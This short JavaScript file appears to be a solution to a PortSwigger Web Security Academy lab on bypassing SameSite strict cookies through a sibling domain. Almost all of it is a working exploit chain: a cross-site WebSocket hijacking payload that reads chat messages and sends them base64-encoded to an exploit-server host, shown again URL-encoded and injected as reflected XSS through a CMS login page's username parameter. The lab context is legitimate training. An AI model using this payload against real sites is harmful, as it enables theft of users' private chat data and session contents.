// The payload below is meant to solve the following lab:
// https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

//<script>
var ws = new WebSocket('wss://[LAB_SUB_DOMAIN].web-security-academy.net/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://[EXPLOIT_SUB_DOMAIN].exploit-server.net/exploit?chats=' + btoa(event.data));
};
//</script>

// After URL Encoding:

// %3c%73%63%72%69%70%74%3e%0a%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%5b%4c%41%42%5f%53%55%42%5f%44%4f%4d%41%49%4e%5d%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%5b%45%58%50%4c%4f%49%54%5f%53%55%42%5f%44%4f%4d%41%49%4e%5d%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%63%68%61%74%73%3d%27%20%2b%20%62%74%6f%61%28%65%76%65%6e%74%2e%64%61%74%61%29%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e

//<script>
document.location = "https://cms-[LAB_SUB_DOMAIN].web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%5b%4c%41%42%5f%53%55%42%5f%44%4f%4d%41%49%4e%5d%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%5b%45%58%50%4c%4f%49%54%5f%53%55%42%5f%44%4f%4d%41%49%4e%5d%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%63%68%61%74%73%3d%27%20%2b%20%62%74%6f%61%28%65%76%65%6e%74%2e%64%61%74%61%29%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=test";
//</script>
